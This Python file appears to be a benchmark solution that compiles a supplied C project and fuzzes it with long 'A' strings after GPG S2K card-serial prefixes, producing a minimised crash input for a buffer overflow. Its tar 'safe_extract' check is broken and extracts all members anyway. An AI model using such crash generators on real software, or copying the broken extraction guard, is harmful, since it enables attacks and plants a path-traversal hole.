import os
import tarfile
import tempfile
import subprocess
import re
import shutil
from typing import List, Tuple, Optional, Set


class Solution:
    def solve(self, src_path: str) -> bytes:
        extract_dir = self._extract_tarball(src_path)
        try:
            result = self._generate_poc(extract_dir)
            if result is not None and isinstance(result, (bytes, bytearray)) and len(result) > 0:
                return bytes(result)
            # Fallback: generic guess based on vulnerability description
            return self._fallback_poc()
        finally:
            # Best-effort cleanup; ignore errors
            try:
                shutil.rmtree(extract_dir)
            except Exception:
                pass

    # -------------------- High-level orchestration --------------------

    def _generate_poc(self, root: str) -> Optional[bytes]:
        # Discover and compile target
        compile_info = self._compile_project(root)
        if compile_info is None:
            # Can't compile; rely on static heuristic only
            prefixes = self._extract_prefixes(root)
            return self._static_guess(prefixes)

        binary_path, main_file, mode = compile_info

        prefixes = self._extract_prefixes(root)
        if not prefixes:
            prefixes = [
                "GPG S2K",
                "GPG",
                "S2K",
                "card serial",
                "serial",
                "card",
            ]

        # Targeted search with structured inputs
        poc = self._find_crash_with_prefixes(binary_path, mode, prefixes)
        if poc is None:
            # As a backup, try simpler generic fuzzing
            poc = self._generic_fuzz(binary_path, mode)
        if poc is None:
            # Still nothing; fall back to static guess
            return self._static_guess(prefixes)

        # Minimize PoC
        minimized = self._minimize_input(binary_path, mode, poc)
        return minimized

    # -------------------- Tarball handling --------------------

    def _extract_tarball(self, src_path: str) -> str:
        tmpdir = tempfile.mkdtemp(prefix="arvo_poc_")
        with tarfile.open(src_path, "r:*") as tf:
            def is_within_directory(directory, target):
                abs_directory = os.path.abspath(directory)
                abs_target = os.path.abspath(target)
                prefix = os.path.commonprefix([abs_directory, abs_target])
                return prefix == abs_directory

            def safe_extract(tar_obj, path="."):
                for member in tar_obj.getmembers():
                    member_path = os.path.join(path, member.name)
                    if not is_within_directory(path, member_path):
                        continue
                tar_obj.extractall(path)

            safe_extract(tf, tmpdir)
        return tmpdir

    # -------------------- Source discovery and compilation --------------------

    def _gather_source_files(self, root: str) -> Tuple[List[str], List[str], List[str], List[str]]:
        c_files: List[str] = []
        h_files: List[str] = []
        cpp_files: List[str] = []
        hpp_files: List[str] = []
        for dirpath, dirnames, filenames in os.walk(root):
            # Skip hidden directories like .git, .svn, etc.
            dirnames[:] = [d for d in dirnames if not d.startswith(".")]
            for f in filenames:
                path = os.path.join(dirpath, f)
                if f.endswith(".c"):
                    c_files.append(path)
                elif f.endswith(".h"):
                    h_files.append(path)
                elif f.endswith((".cpp", ".cc", ".cxx")):
                    cpp_files.append(path)
                elif f.endswith((".hpp", ".hh")):
                    hpp_files.append(path)
        return c_files, h_files, cpp_files, hpp_files

    def _file_has_main(self, path: str) -> bool:
        try:
            with open(path, "r", errors="ignore") as f:
                text = f.read()
        except Exception:
            return False
        return re.search(r'\bint\s+main\s*\(', text) is not None

    def _choose_main_file(self, main_files: List[str]) -> str:
        if len(main_files) == 1:
            return main_files[0]

        def score(path: str) -> Tuple[int, int]:
            name = os.path.basename(path).lower()
            s = 0
            if "fuzz" in name:
                s += 8
            if "poc" in name or "exploit" in name:
                s += 7
            if "test" in name:
                s += 5
            if name in ("main.c", "main.cpp", "driver.c", "driver.cpp"):
                s += 4
            depth = path.count(os.sep)
            return (s, -depth)

        main_files_sorted = sorted(main_files, key=score, reverse=True)
        return main_files_sorted[0]

    def _compile_c(self, root: str, c_files: List[str]) -> Optional[str]:
        if not c_files:
            return None
        out = os.path.join(root, "poc_bin")
        compilers = ["gcc", "clang"]
        common_flags = ["-O0", "-g", "-fno-omit-frame-pointer", "-Wall", "-Wextra", "-Wno-unused-parameter", "-Wno-unused-variable", "-Wno-unused-function", "-lm"]
        flag_sets = [
            ["-std=c11", "-fsanitize=address"],
            ["-std=c11"],
        ]
        for compiler in compilers:
            for flags in flag_sets:
                cmd = [compiler] + flags + c_files + ["-o", out] + common_flags
                try:
                    proc = subprocess.run(
                        cmd,
                        cwd=root,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        timeout=120,
                    )
                except Exception:
                    continue
                if proc.returncode == 0 and os.path.exists(out):
                    return out
        return None

    def _compile_cpp(self, root: str, cpp_files: List[str]) -> Optional[str]:
        if not cpp_files:
            return None
        out = os.path.join(root, "poc_bin")
        compilers = ["g++", "clang++"]
        common_flags = ["-O0", "-g", "-fno-omit-frame-pointer", "-Wall", "-Wextra", "-Wno-unused-parameter", "-Wno-unused-variable", "-Wno-unused-function", "-lm"]
        flag_sets = [
            ["-std=c++17", "-fsanitize=address"],
            ["-std=c++17"],
        ]
        for compiler in compilers:
            for flags in flag_sets:
                cmd = [compiler] + flags + cpp_files + ["-o", out] + common_flags
                try:
                    proc = subprocess.run(
                        cmd,
                        cwd=root,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        timeout=180,
                    )
                except Exception:
                    continue
                if proc.returncode == 0 and os.path.exists(out):
                    return out
        return None

    def _analyze_main_mode(self, main_file: str) -> str:
        try:
            with open(main_file, "r", errors="ignore") as f:
                code = f.read()
        except Exception:
            return "stdin"
        has_argv1 = re.search(r'argv\s*\[\s*1\s*\]', code) is not None
        uses_fopen_arg1 = re.search(r'\bfopen\s*\(\s*argv\s*\[\s*1\s*]', code) is not None
        uses_open_arg1 = re.search(r'\bopen\s*\(\s*argv\s*\[\s*1\s*]', code) is not None
        uses_stdin = "stdin" in code or "STDIN_FILENO" in code or "fd = 0" in code
        if uses_fopen_arg1 or uses_open_arg1:
            return "file_arg"
        if has_argv1 and not uses_fopen_arg1 and not uses_open_arg1:
            return "arg"
        if uses_stdin:
            return "stdin"
        return "stdin"

    def _compile_project(self, root: str) -> Optional[Tuple[str, str, str]]:
        c_files, _, cpp_files, _ = self._gather_source_files(root)

        # Prefer C if there's a main in C files
        c_main_files = [f for f in c_files if self._file_has_main(f)]
        cpp_main_files = [f for f in cpp_files if self._file_has_main(f)]

        if c_main_files:
            chosen_main = self._choose_main_file(c_main_files)
            main_set = set(c_main_files)
            main_set.discard(chosen_main)
            c_files_final = [f for f in c_files if f not in main_set]
            bin_path = self._compile_c(root, c_files_final)
            if bin_path is None:
                return None
            mode = self._analyze_main_mode(chosen_main)
            return bin_path, chosen_main, mode

        # Fallback to C++ if no C main
        if cpp_main_files or cpp_files:
            chosen_main = self._choose_main_file(cpp_main_files) if cpp_main_files else cpp_files[0]
            main_set = set(cpp_main_files)
            main_set.discard(chosen_main)
            cpp_files_final = [f for f in cpp_files if f not in main_set]
            bin_path = self._compile_cpp(root, cpp_files_final)
            if bin_path is None:
                return None
            mode = self._analyze_main_mode(chosen_main)
            return bin_path, chosen_main, mode

        return None

    # -------------------- Prefix extraction from source --------------------

    def _extract_string_literals_from_file(self, path: str) -> List[str]:
        try:
            with open(path, "r", errors="ignore") as f:
                text = f.read()
        except Exception:
            return []
        # Simple string literal regex; handles basic escapes
        pattern = re.compile(r'"([^"\\]*(?:\\.[^"\\]*)*)"', re.DOTALL)
        literals: List[str] = []
        for m in pattern.finditer(text):
            lit = m.group(1)
            try:
                # Interpret common C escapes
                unescaped = bytes(lit, "utf-8").decode("unicode_escape")
            except Exception:
                unescaped = lit
            literals.append(unescaped)
        return literals

    def _extract_prefixes(self, root: str) -> List[str]:
        c_files, h_files, cpp_files, hpp_files = self._gather_source_files(root)
        all_files = c_files + h_files + cpp_files + hpp_files
        keywords = ["gpg", "s2k", "serial", "card"]
        prefixes: Set[str] = set()

        for path in all_files:
            literals = self._extract_string_literals_from_file(path)
            for lit in literals:
                lower = lit.lower()
                if any(k in lower for k in keywords):
                    # Entire literal as candidate
                    cleaned = lit.strip()
                    if cleaned:
                        prefixes.add(cleaned)
                    # Extract tokens as additional candidates
                    tokens = re.findall(r"[A-Za-z0-9_\-]+", lit)
                    for tok in tokens:
                        if any(k in tok.lower() for k in keywords):
                            prefixes.add(tok)

        # Limit number of prefixes to keep search manageable
        prefixes_list = list(prefixes)
        # Sort by heuristics: shorter first, those containing 'gpg' or 's2k' first
        def prefix_score(p: str) -> Tuple[int, int]:
            pl = p.lower()
            score = 0
            if "gpg" in pl:
                score += 4
            if "s2k" in pl:
                score += 3
            if "serial" in pl:
                score += 2
            if "card" in pl:
                score += 1
            return (-score, len(p))

        prefixes_list.sort(key=prefix_score)
        if len(prefixes_list) > 20:
            prefixes_list = prefixes_list[:20]
        return prefixes_list

    # -------------------- Running target with candidate input --------------------

    def _run_candidate(self, binary: str, mode: str, data: bytes) -> bool:
        try:
            if mode == "stdin":
                proc = subprocess.run(
                    [binary],
                    input=data,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE,
                    timeout=0.5,
                )
            elif mode == "file_arg":
                with tempfile.NamedTemporaryFile(delete=False) as tf:
                    tf.write(data)
                    tf.flush()
                    tmpname = tf.name
                try:
                    proc = subprocess.run(
                        [binary, tmpname],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.PIPE,
                        timeout=0.5,
                    )
                finally:
                    try:
                        os.unlink(tmpname)
                    except Exception:
                        pass
            else:  # mode == "arg"
                # Map bytes to a best-effort ASCII string
                try:
                    arg_str = data.decode("ascii", errors="ignore")
                except Exception:
                    arg_str = "A" * max(1, len(data))
                if not arg_str:
                    arg_str = "A"
                proc = subprocess.run(
                    [binary, arg_str],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE,
                    timeout=0.5,
                )
        except subprocess.TimeoutExpired:
            # Treat timeouts as non-crashes for this purpose
            return False
        except Exception:
            return False

        rc = proc.returncode
        stderr_lower = b""
        try:
            stderr_lower = proc.stderr.lower()
        except Exception:
            pass

        # Check for ASan or similar diagnostics
        if b"addresssanitizer" in stderr_lower or b"stack-buffer-overflow" in stderr_lower or b"heap-buffer-overflow" in stderr_lower:
            return True
        if b"stack smashing detected" in stderr_lower:
            return True
        if b"segmentation fault" in stderr_lower:
            return True

        # If terminated by signal (negative return code), treat as crash
        if rc < 0:
            return True

        return False

    # -------------------- Targeted search using prefixes --------------------

    def _find_crash_with_prefixes(self, binary: str, mode: str, prefixes: List[str]) -> Optional[bytes]:
        if not prefixes:
            prefixes = ["GPG S2K", "GPG", "S2K", "serial", "card"]

        # Ensure prefixes are unique and reasonable length
        seen: Set[str] = set()
        filtered_prefixes: List[str] = []
        for p in prefixes:
            p = p.strip()
            if not p:
                continue
            if len(p) > 80:
                # Very long literal likely an error message; truncate to first word
                parts = p.split()
                if parts:
                    p = parts[0]
            if p in seen:
                continue
            seen.add(p)
            filtered_prefixes.append(p)

        if not filtered_prefixes:
            filtered_prefixes = ["GPG S2K", "GPG", "S2K", "serial", "card"]

        delimiters = [" ", ":", " = ", " : ", "=", "\t"]
        # Try smaller lengths first to move towards minimal PoC
        length_options = [32, 40, 48, 64, 80, 96, 128]

        for prefix in filtered_prefixes:
            for delim in delimiters:
                for L in length_options:
                    s = prefix + delim + ("A" * L) + "\n"
                    try:
                        data = s.encode("ascii", errors="ignore")
                    except Exception:
                        continue
                    if not data:
                        continue
                    if self._run_candidate(binary, mode, data):
                        return data

        return None

    # -------------------- Generic fallback fuzzing --------------------

    def _generic_fuzz(self, binary: str, mode: str) -> Optional[bytes]:
        # Simple heuristic fuzz: try a few long ASCII strings incorporating likely keywords
        base_patterns = [
            "GPG S2K card serial ",
            "GPG S2K ",
            "card serial ",
            "serial ",
            "GPG ",
            "S2K ",
        ]
        lengths = [64, 96, 128, 256]

        for base in base_patterns:
            for L in lengths:
                s = base + ("A" * L) + "\n"
                try:
                    data = s.encode("ascii", errors="ignore")
                except Exception:
                    continue
                if self._run_candidate(binary, mode, data):
                    return data

        # Also try just long A's
        for L in [64, 128, 256, 512]:
            data = b"A" * L
            if self._run_candidate(binary, mode, data):
                return data

        return None

    # -------------------- Input minimization --------------------

    def _minimize_input(self, binary: str, mode: str, data: bytes) -> bytes:
        best = bytearray(data)
        changed = True
        # Single-byte deletion-based delta-debugging
        while changed:
            changed = False
            i = 0
            while i < len(best):
                trial = best[:i] + best[i + 1 :]
                if not trial:
                    i += 1
                    continue
                if self._run_candidate(binary, mode, bytes(trial)):
                    best = trial
                    changed = True
                    # Do not increment i; re-test at same index after shrink
                else:
                    i += 1
        return bytes(best)

    # -------------------- Static-only PoC guess --------------------

    def _static_guess(self, prefixes: List[str]) -> bytes:
        # Choose a reasonable prefix related to the vulnerability
        if prefixes:
            # Prefer ones containing both 'gpg' and 's2k', then 'gpg', then 's2k', then 'serial'
            def score(p: str) -> Tuple[int, int]:
                pl = p.lower()
                s = 0
                if "gpg" in pl:
                    s += 4
                if "s2k" in pl:
                    s += 3
                if "serial" in pl:
                    s += 2
                if "card" in pl:
                    s += 1
                return (-s, len(p))
            prefixes_sorted = sorted(prefixes, key=score)
            prefix = prefixes_sorted[0].strip()
        else:
            prefix = "GPG S2K card serial"

        # Construct a simple line-based input with an overly long serial number
        serial_len = 64
        line = f"{prefix}: " + ("A" * serial_len) + "\n"
        try:
            data = line.encode("ascii", errors="ignore")
        except Exception:
            data = b"GPG S2K card serial: " + (b"A" * serial_len) + b"\n"
        return data

    def _fallback_poc(self) -> bytes:
        # Final fallback if everything else fails; aim for description-specific pattern
        prefix = "GPG S2K card serial"
        serial_len = 64
        line = f"{prefix}: " + ("A" * serial_len) + "\n"
        try:
            return line.encode("ascii", errors="ignore")
        except Exception:
            return b"GPG S2K card serial: " + (b"A" * serial_len) + b"\n"